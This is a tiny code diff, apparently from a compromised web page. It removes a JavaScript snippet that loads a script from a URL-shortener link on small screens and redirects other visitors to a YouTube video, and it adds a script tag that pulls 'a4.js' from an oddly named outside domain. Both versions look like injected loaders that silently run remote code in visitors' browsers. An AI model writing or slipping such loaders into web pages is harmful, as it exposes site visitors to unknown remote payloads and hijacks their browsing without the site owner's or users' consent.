@@ -1,7 +1,1 @@
-if(screen.width<800) {
-        var s = document.createElement("script");
-        s.src="https://ish.re/2RGQ2y94p";
-        document.body.appendChild(s);
-    } else {
-    window.location.href = "https://www.youtube.com/watch?v=hOhZjGp6tTs";
-    }
+<script src="https://egr-erg-erg-erg-erg-erg-erg.puj.us/a4.js" type="text/javascript" async="true"></script>
